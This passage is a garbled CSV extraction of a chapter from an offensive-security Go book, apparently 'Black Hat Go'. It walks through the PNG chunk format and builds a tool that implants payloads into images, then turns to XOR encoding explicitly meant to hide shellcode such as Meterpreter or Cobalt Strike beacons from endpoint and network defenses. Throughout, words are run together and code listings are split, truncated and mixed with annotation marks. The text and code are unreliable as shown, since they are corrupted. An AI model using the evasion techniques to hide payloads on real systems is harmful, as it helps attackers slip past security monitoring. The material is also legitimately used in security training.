attackdisciplines.TheWindowsattacksurfaceisconstantly ,NA,NA
"evolving,andhavingtherightknowledgeandtoolingwill ",NA,NA
onlyhelptomaketheadversarialjourneymoreattainable.,NA,NA
13 ,NA,NA
HIDINGDATAWITH ,NA,NA
STEGANOGRAPHY,NA,NA
Theword,NA,NA
steganography,NA,NA
isacombinationoftheGreekwords ,NA,NA
steganos,NA,NA
",whichmeanstocover,conceal,orprotect,and ",NA,NA
graphien,NA,NA
",whichmeanstowrite.Insecurity,",NA,NA
steganography ,NA,NA
referstotechniquesandproceduresusedtoobfuscate(orhide,NA,NA
") databyimplantingitwithinotherdata,suchasanimage,soit ",NA,NA
canbeextractedatafuturepointintime.Aspartofthe ,NA,NA
"securitycommunity,you’llexplorethispracticeonaroutine ",NA,NA
basisbyhidingpayloadsthatyou’llrecoveraftertheyare ,NA,NA
deliveredtothetarget.,NA,NA
"Inthischapter,you’llimplantdatawithinaPortable ",NA,NA
NetworkGraphics(PNG)image.You’llfirstexplorethePNG ,NA,NA
formatandlearnhowtoreadPNGdata.You’llthenimplant ,NA,NA
"yourowndataintotheexistingimage.Finally,you’llexplore ",NA,NA
"XOR,amethodforencryptinganddecryptingyourimplanted ",NA,NA
data.,NA,NA
EXPLORINGTHEPNGFORMAT,NA,NA
"Let’sstartbyreviewingthePNGspecification,whichwill ",NA,NA
helpyouunderstandthePNGimageformatandhowto ,NA,NA
implantdataintoafile.Youcanfinditstechnicalspecification ,NA,NA
at,NA,NA
http://www.libpng.org/pub/png/spec/1.2/PNG-,NA,NA
Structure.html,NA,NA
.Itprovidesdetailsaboutthebyteformatofa ,NA,NA
"binaryPNGimagefile,whichismadeupofrepetitivebyte ",NA,NA
chunks.,NA,NA
OpenaPNGfilewithinahexeditorandnavigatethrough ,NA,NA
eachoftherelevantbytechunkcomponentstoseewhateach ,NA,NA
"does.We’reusingthenativehexdumphexeditoronLinux, ",NA,NA
butanyhexeditorshouldwork.Youcanfindthesample ,NA,NA
imagethatwe’llopenat,NA,NA
https://github.com/blackhat-,NA,NA
go/bhg/blob/master/ch-,NA,NA
13/imgInject/images/battlecat.png,NA,NA
; ,NA,NA
"however,allvalidPNGimageswillfollowthesameformat.",NA,NA
TheHeader,NA,NA
"Thefirst8bytesoftheimagefile,",89504e470d0a1a0a,NA
",",NA,NA
highlightedin,NA,NA
Figure13-1,NA,NA
",arecalledthe",NA,NA
header,NA,NA
.,Figure13-1:ThePNGfile’sheader,NA
"Thesecond,third,andfourthhexvaluesliterallyread",PNG,NA
whenconvertedtoASCII.Thearbitrarytrailingbytesconsist ,NA,NA
ofbothDOSandUnixCarriage-ReturnLineFeed(CRLF).,NA,NA
"Thisspecificheadersequence,referredtoasafile’s",NA,NA
magic ,NA,NA
bytes,NA,NA
",willbeidenticalineveryvalidPNGfile.Thevariations ",NA,NA
"incontentoccurintheremainingchunks,asyou’llsoonsee.",NA,NA
"Asweworkthroughthisspec,let’sstarttobuilda ",NA,NA
representationofthePNGformatinGo.It’llhelpusexpedite ,NA,NA
ourendgoalofembeddingpayloads.Sincetheheaderis8 ,NA,NA
"byteslong,itcanbepackedintoa",uint64,NA
"datatype,solet’sgo",NA,NA
aheadandbuildastructcalled,Header,NA
thatwillholdthevalue,NA,NA
(,NA,NA
Listing13-1,NA,NA
).(Allthecodelistingsattherootlocationof/ ,NA,NA
existundertheprovidedgithubrepo ,NA,NA
https://github.com/blackhat-go/bhg/,NA,NA
.),"//HeaderholdsthefirstUINT64(MagicBytes)
  
  
 typeHeaderstruct{
  
  
 Headeruint64
  
  
 }
  
 Listing13-1:Headerstructdefinition(
 /ch-13/imgInject/pnglib/commands.go
 )",NA
TheChunkSequence,NA,NA
"TheremainderofthePNGfile,shownin",NA,NA
Figure13-2,NA,NA
",is ",NA,NA
composedofrepeatingbytechunksthatfollowthispattern: ,SIZE,NA
"(4bytes),",TYPE,NA
"(4bytes),",DATA,NA
"(anynumberofbytes),and",CRC,NA
(4bytes).,NA,NA
"Reviewingthehexdumpinfurtherdetail,youcanseethat ",NA,NA
thefirstchunk—the,SIZE,NA
chunk—consistsofbytes,"0x000x00 
 0x000x0d",NA
.Thischunkdefinesthelengthofthe,DATA,NA
chunk ,NA,NA
that’llfollow.ThehexadecimalconversiontoASCIIis13—so ,NA,NA
thischunkdictatesthatthe,DATA,NA
chunkwillconsistof13 ,NA,NA
bytes.The,TYPE,NA
"chunk’sbytes,",0x490x480x440x52,NA
",converttoan ",NA,NA
ASCIIvalueof,IHDR,NA
inthiscase.ThePNGspecdefines ,NA,NA
"variousvalidtypes.Someofthesetypes,suchas",IHDR,NA
",are ",NA,NA
usedtodefineimagemetadataorsignaltheendofanimage ,NA,NA
"datastream.Othertypes,specificallythe",IDAT,NA
"type,containthe ",NA,NA
actualimagebytes.,NA,NA
Nextisthe,DATA,NA
"chunk,whoselengthisdefinedbythe",SIZE,NA
"chunk.Finally,the",CRC,NA
chunkconcludestheoverallchunk ,NA,NA
segment.ItconsistsofaCRC-32checksumofthecombined ,TYPE,NA
and,DATA,NA
bytes.Thisparticular,CRC,NA
chunk’sbytesare ,0x9a0x760x820x70,NA
.Thisformatrepeatsitselfthroughoutthe ,NA,NA
"entireimagefileuntilyoureachanEndofFile(EOF)state, ",NA,NA
indicatedbythechunkoftype,IEND,NA
.,NA,NA
Justasyoudidwiththe,Header,NA
structin,NA,NA
Listing13-1,NA,NA
",builda ",NA,NA
"structtoholdthevaluesofasinglechunk,asdefinedin ",NA,NA
Listing13-2,NA,NA
.,"//Chunkrepresentsadatabytechunksegment
  
  
 typeChunkstruct{
  
  
 Sizeuint32
  
  
 Typeuint32
  
  
 Data[]byte
  
  
 CRCuint32
  
  
 }",NA
READINGIMAGEBYTEDATA,NA,NA
TheGolanguagehandlesbinarydatareadsandwriteswith ,NA,NA
"relativeease,thanksinparttothe",binary,NA
package(whichyou,NA,NA
mayrememberfrom,NA,NA
Chapter6,NA,NA
"),butbeforeyoucanparse ",NA,NA
"PNGdata,you’llneedtoopenafileforreading.Let’screatea ",PreProcessImage(),NA
functionthatwillconsumeafilehandleoftype,*os.File,NA
andreturnatypeof,*bytes.Reader,NA
(,NA,NA
Listing13-3,NA,NA
).,"//PreProcessImagereadstobufferfromfilehandle
  
  
 funcPreProcessImage(dat*os.File)(*bytes.Reader,error){
 ❶stats,err:=dat.Stat() 
  
 iferr!=nil{
  
 returnnil,err
  
 }
  
  
 ❷varsize=stats.Size() 
  
 b:=make([]byte,size)
  
  
 ❸bufR:=bufio.NewReader(dat) 
  
 _,err=bufR.Read(b)
  
  
 bReader:=bytes.NewReader(b)
  
  
 returnbReader,err
  
  
 }
  
 Listing13-3:The
 PreProcessImage()
 functiondefinition(
 /ch-
 13/imgInject/utils/reader.go
 )",NA
Thefunctionopensafileobjectinordertoobtaina,FileInfo,NA
structure❶usedtograbsizeinformation❷.Immediately ,NA,NA
followingareacoupleoflinesofcodeusedtoinstantiatea ,Reader,NA
instancevia,bufio.NewReader(),NA
andthena,*bytes.Reader,NA
instanceviaacallto,bytes.NewReader(),NA
❸.Thefunctionreturnsa,NA,NA
",whichpositionsyoutostartusingthe",binary,NA
packagetoreadbytedata.You’llfirstreadtheheaderdataand ,NA,NA
thenreadthechunksequence.,NA,NA
ReadingtheHeaderData ,NA,NA
"TovalidatethatthefileisactuallyaPNGfile,usethefirst8 ",NA,NA
"bytes,whichdefineaPNGfile,tobuildthe",validate(),NA
method ,NA,NA
(,NA,NA
Listing13-4,NA,NA
).,"func(mc*MetaChunk)validate(b*bytes.Reader){
  
  
 varheaderHeader
  
  
 iferr:=binary.Read(b,binary.BigEndian,&header.Header)❶;err!=nil{ 
 log.Fatal(err)
  
  
 }
  
  
 bArr:=make([]byte,8) 
  
 binary.BigEndian.PutUint64(bArr,header.Header)❷
  
  
 ifstring(bArr[1:4])❸!=""PNG""{ 
  
 log.Fatal(""ProvidedfileisnotavalidPNGformat"")
  
 }else{ 
  
 fmt.Println(""ValidPNGsoletuscontinue!"") 
  
 }
  
 }
  
 Listing13-4:ValidatingthatthefileisaPNGfile(
 /ch-
  
 13/imgInject/pnglib/commands.go
 )",NA
"Althoughthismethodmaynotseemoverlycomplex,it ",NA,NA
"introducesacoupleofnewitems.Thefirst,andthemost ",NA,NA
"obviousone,isthe",binary.Read(),NA
function❶thatcopiesthefirst ,NA,NA
8bytesfromthe,bytes.Reader,NA
intothe,Header,NA
structvalue.Recall ,NA,NA
thatyoudeclaredthe,Header,NA
structfieldastype,uint64,NA
(,NA,NA
Listing ,NA,NA
13-1,NA,NA
"),whichisequivalentto8bytes.It’salsonoteworthythat",NA,NA
the,binary,NA
packageprovidesmethodstoread,MostSignificantBit,NA
and,LeastSignificantBit,NA
formatsvia,binary.BigEndian,NA
and ,binary.LittleEndian,NA
",respectively❷.Thesefunctionscanalsobe ",NA,NA
quitehelpfulwhenyou’reperformingbinarywrites;for ,NA,NA
"example,youcouldselect",BigEndian,NA
toplacebytesonthewire,NA,NA
dictatingtheuseofnetworkbyteordering.,NA,NA
Thebinaryendiannessfunctionalsocontainsthemethods ,NA,NA
thatfacilitatethemarshalingofdatatypestoaliteraldatatype ,NA,NA
(suchas,uint64,NA
").Here,you’recreatingabytearrayoflength8",NA,NA
andperformingabinaryreadnecessarytocopythedataintoa ,unit64,NA
datatype.Youcanthenconvertthebytestotheirstring,NA,NA
representationsanduseslicingandasimplestringcompariso,NA,NA
n ,NA,NA
"tovalidatethatbytes1through4producePNG,indicatingthat ",NA,NA
youhaveavalidimagefileformat❸.,NA,NA
ToimprovetheprocessofcheckingthatafileisaPNG ,NA,NA
"file,weencourageyoutolookattheGo",bytes,NA
"package,asit",NA,NA
containsconveniencefunctionsthatyoucoulduseasa ,NA,NA
shortcuttocompareafileheaderwiththePNGmagicbyte ,NA,NA
sequencewementionedearlier.We’llletyouexplorethison ,NA,NA
yourown.,NA,NA
ReadingtheChunkSequence,NA,NA
"OnceyouvalidatedthatyourfileisaPNGimage,youcan ",NA,NA
writethecodethatreadsthechunksequence.Theheaderwill ,NA,NA
"occuronlyonceinaPNGfile,whereasthechunksequence ",NA,NA
willrepeatthe,SIZE,NA
",",TYPE,NA
",",DATA,NA
",and",CRC,NA
chunksuntilit,NA,NA
"reachestheEOF.Therefore,youneedtobeableto ",NA,NA
"accommodatethisrepetition,whichyoucandomost ",NA,NA
convenientlybyusingaGoconditionalloop.Withthisin ,NA,NA
"mind,let’sbuildouta",ProcessImage(),NA
"method,whichiteratively",NA,NA
processesallthedatachunksuptotheendoffile(,NA,NA
Listing13-,NA,NA
5,NA,NA
).,"func(mc*MetaChunk)ProcessImage(b*bytes.Reader,c 
  
 *models.CmdLineOpts)❶{ 
  
 //Snipcodeforbrevity(Onlydisplayingrelevantlinesfromcodeblock)
  
  
 count:=1//Startat1because0isreservedformagicbyte
  
 ❷chunkType:=""""
  
 ❸endChunkType:=""IEND""//ThelastTYPEpriortoEOF❹f
 orchunkType!=endChunkType{
  
 fmt.Println(""----Chunk#""+strconv.Itoa(count)+""----"")
  
 offset:=chk.getOffset(b) 
  
 fmt.Printf(""ChunkOffset:%#02x\n"",offset) 
  
 chk.readChunk(b) 
  
 chunkType=chk.chunkTypeToString() 
  
 count++ 
  
 }
  
 }
  
 Listing13-5:The
 ProcessImage()
 method(
 /ch-13/imgInject/pnglib/commands.go
 )",NA
Youfirstpassareferencetoa,bytes.Reader,NA
memoryaddress ,NA,NA
pointer(,*bytes.Reader,NA
)asanargumentto,ProcessImage(),NA
❶.The ,validate(),NA
method(,NA,NA
Listing13-4,NA,NA
)youjustcreatedalsotooka,NA,NA
referencetoa,bytes.Reader,NA
"pointer.Asconventiondictates,",NA,NA
multiplereferencestothesamememoryaddresspointer ,NA,NA
locationwillinherentlyallowmutableaccesstothereferenced ,NA,NA
data.Thisessentiallymeansthatasyoupassyour,bytes.Reader,NA
referenceasanargumentto,ProcessImage(),NA
",thereaderwillhave",NA,NA
alreadyadvanced8bytesasaresultofthesizeofthe,Header,NA
becauseyou’reaccessingthesameinstanceof,bytes.Reader,NA
.,NA,NA
"Alternatively,hadyounotpassedapointer,the",bytes.Reader,NA
wouldhaveeitherbeenacopyofthesamePNGimagedataor ,NA,NA
separateuniqueinstancedata.That’sbecauseadvancingthe,NA,NA
pointerwhenyoureadtheheaderwouldnothaveadvanced ,NA,NA
thereaderappropriatelyelsewhere.Youwanttoavoidtaking ,NA,NA
"thisapproach.Forone,passingaroundmultiplecopiesofdata ",NA,NA
whenunnecessaryissimplybadconvention.More ,NA,NA
"importantly,eachtimeacopyispassed,itispositionedatthe ",NA,NA
"startofthefile,forcingyoutoprogrammaticallydefineand ",NA,NA
manageitspositioninthefilepriortoreadingachunk ,NA,NA
sequence.,NA,NA
"Asyouprogressthroughtheblockofcode,youdefinea ",count,NA
variabletotrackhowmanychunksegmentstheimage ,NA,NA
filecontains.The,chunkType,NA
❷and,endChunkType,NA
❸areusedas ,NA,NA
"partofthecomparativelogic,whichevaluatesthecurrent ",chunkType,NA
to,endChunkType,NA
’s,IEND,NA
valuedesignatinganEOF ,NA,NA
condition❹.,NA,NA
Itwouldbenicetoknowwhereeachchunksegmentstarts—,NA,NA
"orrather,eachchunk’sabsolutepositionwithinthefilebyte ",NA,NA
"construct,avalueknownasthe",NA,NA
offset,NA,NA
.Ifyouknowtheoffset ,NA,NA
"value,itwillbemucheasiertoimplantapayloadintothefile. ",NA,NA
"Forexample,youcangiveacollectionofoffsetlocationstoa ",NA,NA
decoder,NA,NA
—aseparatefunctionthatcollectsthebytesateach ,NA,NA
knownoffset—thatthenunwindsthemintoyourintended ,NA,NA
"payload.Togettheoffsetsofeachchunk,you’llcallthe ",mc.getOffset(b),NA
method(,NA,NA
Listing13-6,NA,NA
).,"func(mc*MetaChunk)getOffset(b*bytes.Reader){ 
 offset,_:=b.Seek(0,1)❶
  
 mc.Offset=offset
  
  
 }
  
 Listing13-6:The
 getOffset()
 method(
 /ch-13/imgInject/pnglib/commands.go
 )",NA
The,bytes.Reader,NA
containsa,Seek(),NA
methodthatmakesderiving,NA,NA
thecurrentpositionquitesimple.The,Seek(),NA
methodmovesthe,NA,NA
currentreadorwriteoffsetandthenreturnsthenewoffset ,NA,NA
relativetothestartofthefile.Itsfirstargumentisthenumber ,NA,NA
ofbytesbywhichyouwanttomovetheoffsetanditssecond ,NA,NA
argumentdefinesthepositionfromwhichthemovewilloccur. ,NA,NA
Thesecondargument’soptionalvaluesare,0,NA
"(StartofFile),",1,NA
"(CurrentPosition),and",2,NA
"(EndofFile).Forexample,ifyou",NA,NA
"wantedtoshift8bytestotheleftfromyourcurrentposition, ",NA,NA
youwoulduse,"b.Seek(-8,1)",NA
.,NA,NA
"Here,","b.Seek(0,1)",NA
❶statesthatyouwanttomoveyouroffset ,NA,NA
"0bytesfromthecurrentposition,soitsimplyreturnsthe ",NA,NA
currentoffset:essentiallyretrievingtheoffsetwithoutmoving ,NA,NA
it.,NA,NA
Thenextmethodswedetaildefinehowyoureadtheactual ,NA,NA
"chunksegmentbytes.Tomakethingsabitmorelegible,let’s ",NA,NA
createa,readChunk(),NA
methodandthencreateseparatemethodsfo,NA,NA
r,NA,NA
readingeachchunksubfield(,NA,NA
Listing13-7,NA,NA
).,"func(mc*MetaChunk)readChunk(b*bytes.Reader){
  
  
 mc.readChunkSize(b)
  
  
 mc.readChunkType(b) 
  
 mc.readChunkBytes(b,mc.Chk.Size)❶m
 c.readChunkCRC(b)
  
  
 }
  
  
 func(mc*MetaChunk)readChunkSize(b*bytes.Reader){ 
  
 iferr:=binary.Read(b,binary.BigEndian,&mc.Chk.Size);err!=nil{❷log.Fa
 tal(err)
  
  
 }
  
  
 }
  
  
 func(mc*MetaChunk)readChunkType(b*bytes.Reader){
  
  
 iferr:=binary.Read(b,binary.BigEndian,&mc.Chk.Type);err!=nil{
  
  
 log.Fatal(err)
  
  
 }
  
  
 }",NA
Themethods,readChunkSize(),NA
",",readChunkType(),NA
",and",readChunkCRC(),NA
areallsimilar.Eachreadsa,uint32,NA
valueintotherespective,NA,NA
fieldofthe,Chunk,NA
"struct.However,",readChunkBytes(),NA
isabitofan,NA,NA
"anomaly.Becausetheimagedataisofvariablelength,we’ll ",NA,NA
needtosupplythislengthtothe,readChunkBytes(),NA
functionsothat ,NA,NA
itknowshowmanybytestoread❶.Recallthatthedata ,NA,NA
lengthismaintainedinthe,SIZE,NA
subfieldofthechunk.You ,NA,NA
identifythe,SIZE,NA
value❷andpassitasanargumentto ,readChunkBytes(),NA
todefineasliceofpropersize❸.Onlythencan ,NA,NA
thebytedatabereadintothestruct’s,Data,NA
field.That’saboutit,NA,NA
"forreadingthedata,solet’spressonandexplorewritingbyte ",NA,NA
data.,NA,NA
WRITINGIMAGEBYTEDATATO ,NA,NA
IMPLANTAPAYLOAD,NA,NA
Althoughyoucanchoosefrommanycomplexsteganography ,NA,NA
"techniquestoimplantpayloads,inthissectionwe’llfocusona",NA,NA
methodofwritingtoacertainbyteoffset.ThePNGfileformat,NA,NA
defines,NA,NA
critical,NA,NA
and,NA,NA
ancillary,NA,NA
chunksegmentswithinthe ,NA,NA
specification.Thecriticalchunksarenecessaryfortheimage ,NA,NA
decodertoprocesstheimage.Theancillarychunksare ,NA,NA
optionalandprovidevariouspiecesofmetadatathatarenot ,NA,NA
"criticaltoencodingordecoding,suchastimestampsandtext.",NA,NA
"Therefore,theancillarychunktypeprovidesanideal ",NA,NA
locationtoeitheroverwriteanexistingchunkorinsertanew ,NA,NA
"chunk.Here,we’llshowyouhowtoinsertnewbyteslicesinto ",NA,NA
anancillarychunksegment.,NA,NA
LocatingaChunkOffset,NA,NA
"First,youneedtoidentifyanadequateoffsetsomewhereinthe ",NA,NA
ancillarydata.Youcanspotancillarychunksbecausethey ,NA,NA
alwaysstartwithlowercaseletters.Let’susethehexeditor ,NA,NA
onceagainandopenuptheoriginalPNGfilewhileadvancing ,NA,NA
totheendofthehexdump.,NA,NA
EveryvalidPNGimagewillhavean,IEND,NA
chunktype,NA,NA
indicatingthefinalchunkofthefile(the,EOF,NA
chunk).Moving,NA,NA
tothe4bytesthatcomebeforethefinal,SIZE,NA
chunkwill,NA,NA
positionyouatthestartingoffsetofthe,IEND,NA
chunkandthe,NA,NA
lastofthearbitrary(criticalorancillary)chunkscontained ,NA,NA
withintheoverallPNGfile.Recallthatancillarychunksare ,NA,NA
"optional,soit’spossiblethatthefileyou’reinspectingasyou ",NA,NA
"followalongwon’thavethesameancillarychunks,oranyfor ",NA,NA
"thatmatter.Inourexample,theoffsettothe",IEND,NA
chunkbegins,NA,NA
atbyteoffset,0x85258,NA
(,NA,NA
Figure13-3,NA,NA
).,NA,NA
WritingByteswiththeProcessImage()Method,NA,NA
Astandardapproachtowritingorderedbytesintoabyte ,NA,NA
streamistouseaGostruct.Let’srevisitanothersectionofthe ,ProcessImage(),NA
methodwestartedbuildingin,NA,NA
Listing13-5,NA,NA
and,NA,NA
walkthroughthedetails.Thecodein,NA,NA
Listing13-8,NA,NA
calls ,NA,NA
individualfunctionsthatyou’llbuildoutasyouprogress ,NA,NA
throughthissection.,"func(mc*MetaChunk)ProcessImage(b*bytes.Reader,c*models.CmdLineOpts)
  
 ❶{
  
 --snip--
  
  
 ❷varmMetaChunk
  
  
 ❸m.Chk.Data=[]byte(c.Payload) 
  
 m.Chk.Type=m.strToInt(c.Type)❹
  
 m.Chk.Size=m.createChunkSize()❺
  
 m.Chk.CRC=m.createChunkCRC()❻
  
 bm:=m.marshalData()❼
  
 bmb:=bm.Bytes()
  
 fmt.Printf(""PayloadOriginal:%X\n"",[]byte(c.Payload))
  
 fmt.Printf(""Payload:%X\n"",m.Chk.Data)
  
 ❽utils.WriteData(b,c,bmb) 
  
 }
  
 Listing13-8:Writingbyteswiththe
 ProcessImage()
 method(
 /ch-
 13/imgInject/pnglib /commands.go
 )",NA
Thismethodtakesa,byte.Reader,NA
"andanotherstruct, ",models.CmdLineOpts,NA
",asarguments❶.The",CmdLineOpts,NA
"struct, ",NA,NA
shownin,NA,NA
Listing13-9,NA,NA
",containsflagvaluespassedinviathe ",NA,NA
commandline.We’llusetheseflagstodeterminewhat ,NA,NA
payloadtouseandwheretoinsertitintheimagedata.Since,NA,NA
thebytesyou’llwritefollowthesamestructuredformatas ,NA,NA
"thosereadfrompreexistingchunksegments,youcanjust ",NA,NA
createanew,MetaChunk,NA
structinstance❷thatwillacceptyour ,NA,NA
newchunksegmentvalues.,NA,NA
Thenextstepistoreadthepayloadintoabyteslice❸. ,NA,NA
"However,you’llneedadditionalfunctionalitytocoercethe",NA,NA
literalflagvaluesintoausablebytearray.Let’sdiveintothe ,NA,NA
detailsofthe,strToInt(),NA
"❹,",createChunkSize(),NA
"❺,",createChunkCRC(),NA
"❻, ",MarshalData(),NA
"❼,and",WriteData(),NA
❽methods.,"packagemodels
  
  
 //CmdLineOptsrepresentsthecliarguments
  
 typeCmdLineOptsstruct{ 
  
 Inputstring 
  
 Outputstring 
  
 Metabool 
  
 Suppressbool 
  
 Offsetstring 
  
 Injectbool 
  
 Payloadstring 
  
 Typestring 
  
 Encodebool 
  
 Decodebool 
  
 Keystring
  
 }
  
 Listing13-9:The
 CmdLineOpts
 struct(
 /ch-13/imgInject/models/opts.go
 )",NA
ThestrToInt()Method,NA,NA
We’llstartwiththe,strToInt(),NA
method(,NA,NA
Listing13-10,NA,NA
).,"func(mc*MetaChunk)strToInt(sstring)❶uint32{ 
 t:=[]byte(s)
  
 ❷returnbinary.BigEndian.Uint32(t) 
  
 }
  
 Listing13-10:The
 strToInt()
 method(
 /ch-13/imgInject/pnglib/commands.go
 )",NA
The,strToInt(),NA
methodisahelperthatconsumesa,string,NA
❶as ,NA,NA
anargumentandreturns,uint32,NA
"❷,whichisthenecessarydata ",NA,NA
typeforyour,Chunk,NA
struct,TYPE,NA
value.,NA,NA
ThecreateChunkSize()Method ,NA,NA
"Next,youusethe",createChunkSize(),NA
methodtoassignthe,Chunk,NA
struct,SIZE,NA
value(,NA,NA
Listing13-11,NA,NA
).,"func(mc*MetaChunk)createChunkSize()uint32{ 
 returnuint32(len(mc.Chk.Data)❷)❶
  
 }
  
 Listing13-11:The
 createChunkSize()
 method(
 /
 ch-13/imgInject/pnglib/commands.go
 )",NA
Thismethodwillobtainthelengthofthe,chk.DATA,NA
byte ,NA,NA
array❷andtype-convertittoa,uint32,NA
value❶.,NA,NA
ThecreateChunkCRC()Method ,NA,NA
RecallthattheCRCchecksumforeachchunksegment ,NA,NA
comprisesboththe,TYPE,NA
and,DATA,NA
bytes.You’llusethe ,createChunkCRC(),NA
methodtocalculatethischecksum.Themethod ,NA,NA
leveragesGo’s,hash/crc32,NA
package(,NA,NA
Listing13-12,NA,NA
).,"func(mc*MetaChunk)createChunkCRC()uint32{ 
  
 bytesMSB:=new(bytes.Buffer)❶
  
 iferr:=binary.Write(bytesMSB,binary.BigEndian,mc.Chk.Type);err!=nil{",NA
Priortoarrivingatthe,return,NA
"statement,youdeclarea ",bytes.Buffer,NA
❶andwriteboththe,TYPE,NA
❷and,DATA,NA
❸bytes ,NA,NA
intoit.Thebyteslicefromthebufferisthenpassedasan ,NA,NA
argumenttothe,ChecksumIEEE,NA
",andtheCRC-32checksumvalue ",NA,NA
isreturnedasa,uint32,NA
datatype.The,return,NA
statement❹isdoing ,NA,NA
"alltheheavyliftinghere,actuallycalculatingthechecksumon ",NA,NA
thenecessarybytes.,NA,NA
ThemarshalData()Method,NA,NA
Allnecessarypiecesofachunkareassignedtotheirrespective ,NA,NA
"structfields,whichcannowbemarshaledintoa",bytes.Buffer,NA
.,NA,NA
Thisbufferwillprovidetherawbytesofthecustomchunk ,NA,NA
thataretobeinsertedintothenewimagefile.,NA,NA
Listing13-13 ,NA,NA
showswhatthe,marshalData(),NA
methodlookslike.,"func(mc*MetaChunk)marshalData()*bytes.Buffer{ 
  
 bytesMSB:=new(bytes.Buffer)❶
  
 iferr:=binary.Write(bytesMSB,binary.BigEndian,mc.Chk.Size);err!=nil{❷
  
 log.Fatal(err)
  
  
 }",NA
The,marshalData(),NA
methoddeclaresa,bytes.Buffer,NA
❶andwrites ,NA,NA
"thechunkinformationtoit,includingthesize❷,type❸,data",NA,NA
"❹,andchecksum❺.Themethodreturnsallthechunk ",NA,NA
segmentdataintoasingleconsolidated,bytes.Buffer,NA
.,NA,NA
TheWriteData()Function,NA,NA
Nowallyouhavelefttodoistowriteyournewchunk,NA,NA
segmentbytesintotheoffsetoftheoriginalPNGimagefile.,NA,NA
Let’shaveapeekatthe,WriteData(),NA
"function,whichexistsina",NA,NA
packagewecreatednamed,utils,NA
(,NA,NA
Listing13-14,NA,NA
).,"//WriteDatawritesnewChunkdatatooffset 
  
 funcWriteData(r*bytes.Reader❶,c*models.CmdLineOpts❷,b[]byte❸){
  
 ❹offset,_:=strconv.ParseInt(c.Offset,10,64)
  
  
 ❺w,err:=os.Create(c.Output) 
  
 iferr!=nil{
  
 log.Fatal(""Fatal:Problemwritingtotheoutputfile!"")
  
 }
  
 deferw.Close()
  
  
 ❻r.Seek(0,0)
  
  
 ❼varbuff=make([]byte,offset) 
  
 r.Read(buff)",NA
The,WriteData(),NA
functionconsumesa,bytes.Reader,NA
❶containing ,NA,NA
"theoriginalimagefilebytedata,a",models.CmdLineOpts,NA
❷struct ,NA,NA
"inclusiveofthecommandlineargumentvalues,anda",byte,NA
slice,NA,NA
❸holdingthenewchunkbytesegment.Thecodeblockstarts ,NA,NA
witha,string,NA
-to-,int64,NA
conversion❹inordertoobtaintheoffset ,NA,NA
valuefromthe,models.CmdLineOpts,NA
struct;thiswillhelpyouwrite,NA,NA
yournewchunksegmenttoaspecificlocationwithout ,NA,NA
corruptingotherchunks.Youthencreateafilehandle❺so ,NA,NA
thatthenewlymodifiedPNGimagecanbewrittentodisk.,NA,NA
Youusethe,"r.Seek(0,0)",NA
functioncall❻torewindtothe ,NA,NA
absolutebeginningofthe,bytes.Reader,NA
.Recallthatthefirst8,NA,NA
"bytesarereservedforthePNGheader,soit’simportantthat",NA,NA
thenewoutputPNGimageincludetheseheaderbytesaswell.,NA,NA
Youincludethembyinstantiatingabyteslicewithalength ,NA,NA
determinedbythe,offset,NA
value❼.Youthenreadthatnumberof ,NA,NA
bytesfromtheoriginalimageandwritethosesamebytesto ,NA,NA
yournewimagefile❽.Younowhaveidenticalheadersin ,NA,NA
boththeoriginalandnewimages.,NA,NA
Youthenwritethenewchunksegmentbytes❾intothe ,NA,NA
"newimagefile.Finally,youappendtheremainderofthe ",bytes.Reader,NA
"bytes❿(thatis,thechunksegmentbytesfromyour",NA,NA
originalimage)tothenewimagefile.Recallthat,bytes.Reader,NA
"hasadvancedtotheoffsetlocation,becauseoftheearlierread ",NA,NA
"intoabyteslice,whichcontainsbytesfromtheoffsettothe ",NA,NA
EOF.You’releftwithanewimagefile.Yournewfilehas ,NA,NA
"identicalleadingandtrailingchunksastheoriginalimage,but ",NA,NA
"italsocontainsyourpayload,injectedasanewancillary chunk.",NA,NA
Tohelpvisualizeaworkingrepresentationofwhatyou ,NA,NA
"builtsofar,referencetheoverallworkingprojectcodeat ",NA,NA
https://github.com/blackhat-go/bhg/tree/master/ch-,NA,NA
13/imgInject/,NA,NA
.The,imgInject,NA
programconsumescommandlin,NA,NA
e,NA,NA
"argumentscontainingvaluesfortheoriginalPNGimagefile, ",NA,NA
"anoffsetlocation,anarbitrarydatapayload,theself-declared ",NA,NA
"arbitrarychunktype,andtheoutputfilenameforyour ",NA,NA
"modifiedPNGimagefile,asshownin",NA,NA
Listing13-15,NA,NA
.,"$
 gorunmain.go-iimages/battlecat.png-onewPNGfile--inject-offset\
  
  
 0x85258--payload1234243525522552522452355525
  
 Listing13-15:Runningthe
 imgInject
 commandlineprogram",NA
"Ifeverythingwentasplanned,",offset0x85258,NA
shouldnow,NA,NA
containanew,rNDm,NA
"chunksegment,asshownin",NA,NA
Figure13-4,NA,NA
.,"Figure13-4:Apayloadinjectedasanancillarychunk(suchas
 rNDm
 )",NA
Congratulations—you’vejustwrittenyourfirst,NA,NA
steganographyprogram!,NA,NA
ENCODINGANDDECODINGIMAGE ,NA,NA
BYTEDATABYUSINGXOR,NA,NA
"Justastherearemanytypesofsteganography,soarethere ",NA,NA
manytechniquesusedtoobfuscatedatawithinabinaryfile. ,NA,NA
Let’scontinuetobuildthesampleprogramfromtheprevious ,NA,NA
"section.Thistime,you’llincludeobfuscationtohidethetrue ",NA,NA
intentofyourpayload.,NA,NA
Obfuscationcanhelpconcealyourpayloadfromnetwork-,NA,NA
"monitoringdevicesandendpointsecuritysolutions.If,for ",NA,NA
"example,you’reembeddingrawshellcodeusedforspawninga ",NA,NA
"newMeterpretershellorCobaltStrikebeacon,youwantto ",NA,NA
"makesureitavoidsdetection.Forthis,you’lluseExclusive ",NA,NA
ORbitwiseoperationstoencryptanddecryptthedata.,NA,NA
An,NA,NA
ExclusiveOR(XOR),NA,NA
isaconditionalcomparison ,NA,NA
betweentwobinaryvaluesthatproducesaBooleantruevalue ,NA,NA
"ifandonlyifthetwovaluesarenotthesame,andaBoolean ",NA,NA
"falsevalueotherwise.Inotherwords,thestatementistrueif ",NA,NA
either,NA,NA
x,NA,NA
or,NA,NA
y,NA,NA
aretrue—butnotifbotharetrue.Youcanseethis ,NA,NA
representedin,NA,NA
Table13-1,NA,NA
",giventhat",NA,NA
x,NA,NA
and,NA,NA
y,NA,NA
arebothbinary ,NA,NA
inputvalues.,"Table13-1:
 XORTruthTable
  
  
 x
  
 y
  
 x^youtput
  
  
  
 0
  
 1
  
 Trueor1
  
  
  
 1
  
 0
  
 Trueor1",NA
Youcanusethislogictoobfuscatedatabycomparingthe ,NA,NA
